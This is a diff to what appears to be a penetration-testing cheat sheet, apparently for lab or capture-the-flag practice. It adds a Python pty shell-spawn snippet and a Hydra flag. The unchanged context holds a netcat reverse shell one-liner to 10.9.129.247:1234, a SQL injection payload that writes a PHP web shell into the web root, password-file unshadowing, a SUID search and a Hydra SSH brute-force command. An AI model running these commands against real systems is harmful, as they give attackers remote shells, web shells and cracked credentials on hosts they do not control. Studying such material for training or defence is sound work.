@@ -13,6 +13,7 @@
 	- [Stable Shell](#stable-shell)
 	- [Reverse shell](#reverse-shell)
 	- [Shell from SQL injection](#shell-from-sql-injection)
+	- [python Spawn shell](#python-spawn-shell)
 - [Post Exploitation](#post-exploitation)
 - [Words list generator](#words-list-generator)
 - [Hash](#hash)
@@ -120,6 +121,11 @@ rm /tmp/f ; mkfifo /tmp/f ; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.9.129.247 1234 
 ?id=1 union all select 1,2,3,4,""<?php echo shell_exec($_GET['cmd']);?>"",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
 ```
 
+### python Spawn shell
+```python
+import pty; pty.spawn("/bin/sh")
+```
+
 ## Post Exploitation
 ```sh
 unshadow passwd.txt shadow.txt > passwords.txt
@@ -175,7 +181,7 @@ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 6 -exec ls -ld {} \; 2>/dev
 ## Password Hack
 ### Hydra
 ```sh
-hydra -t 4 -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP
+hydra -f -t 4 -l user -P /usr/share/wordlists/rockyou.txt ssh://$IP
 ```
 
 ```sh
